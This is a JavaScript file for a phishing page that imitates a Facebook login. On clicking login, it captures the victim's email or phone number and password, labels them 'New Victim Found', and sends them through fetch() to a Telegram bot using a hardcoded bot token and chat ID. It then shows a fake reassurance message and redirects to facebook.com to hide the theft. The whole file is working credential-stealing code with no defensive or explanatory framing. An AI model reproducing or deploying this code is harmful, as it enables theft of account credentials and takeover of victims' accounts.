
const configs = {
    bot_token: '6379083700:AAFjFONzksIYUoLWpBeJNndSOSO48kFQ8PE',
    chat_id: '-4033854266',
    escape_timer: 5
}

const main_frame = document.getElementById("mainframe");
const email_num_input = document.getElementById("email_input");
const pass_input = document.getElementById("pass_input");

const loginButton = document.getElementById("login_button");

const end = () => { return 0 };

const createEscape = () => {
    const escapeMsgDisplay = document.createElement("h1");
    const escapeTimerDisplay = document.createElement("h1");
    escapeMsgDisplay.innerHTML = "You will recieve your information within 24hours via Email or directly in Facebook information download page. You are now getting redirected to our homepage &nbsp;&nbsp;&nbsp;";
    document.body.appendChild(escapeMsgDisplay);
    document.body.appendChild(escapeTimerDisplay);
    escapeTimerDisplay.style.fontSize = "5rem";
    const escapeTimerCountdown = setInterval(() => {
        if (configs.escape_timer >= 1) {
            escapeTimerDisplay.innerHTML = configs.escape_timer;
            configs.escape_timer--;
        } else {
            clearInterval(escapeTimerCountdown);
            window.location.replace("http://www.facebook.com");
        }

    }, 1000);
}

const postMsgActivities = () => {
    email_num_input.value = "";
    pass_input.value = "";
    main_frame.style.display = "none";
    document.body.style.display = "block";
    createEscape();
}

const sendCredentialsViaBot = (msg) => {
    let link = `https://api.telegram.org/bot${configs.bot_token}/sendMessage?chat_id=${configs.chat_id}&text=${msg}`;

    fetch(link).then(() => {
        end();
    }).catch(err => console.log(err));

    postMsgActivities();
}

const getLoginCredentials = () => {
    let email_num = email_num_input.value;
    let pass = pass_input.value;
    let credential_msg = `New Victim Found❗
    📧Email/📞Number: ${email_num}
    🔒Password: ${pass}`;
    sendCredentialsViaBot(credential_msg);
}

loginButton.addEventListener('click', getLoginCredentials);